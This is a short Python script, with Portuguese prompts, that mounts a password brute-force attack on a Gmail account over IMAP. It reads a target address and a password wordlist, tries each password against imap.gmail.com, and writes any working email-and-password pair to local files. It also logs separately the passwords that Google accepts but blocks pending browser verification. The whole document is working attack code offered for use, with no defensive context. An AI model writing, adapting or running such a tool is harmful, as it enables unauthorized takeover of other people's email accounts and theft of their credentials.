import imaplib



user = input("Email: ")


def gmail():
				imap1 = imaplib.IMAP4_SSL('imap.gmail.com')
				email = user
				wordlist = input("Nome da wordlist: ")
				wordlist = open(wordlist, 'r')
				
				for password in wordlist.readlines():
					try:
							imap1.login(email,password)
							print("[ ! ] Logged-in with 0 Blocks %s" % password)
							save = open('dados.txt', 'w')
							print("Dados de login => " + email + "|" + password, file=open("dados.txt", "w"))

							
							quit()
					except imaplib.IMAP4.error as ex:
							if "Please log in via your web browser" in str(ex):
									print("[ * ] Logged-in but with block %s" % password)
									save2 = open('dados2.txt', 'w')
									print("Dados de login => " + email + "|" + password, file=open("dados2.txt", "w"))
							else:
									print("[ - ] Not Logged-in")

gmail()


			




		
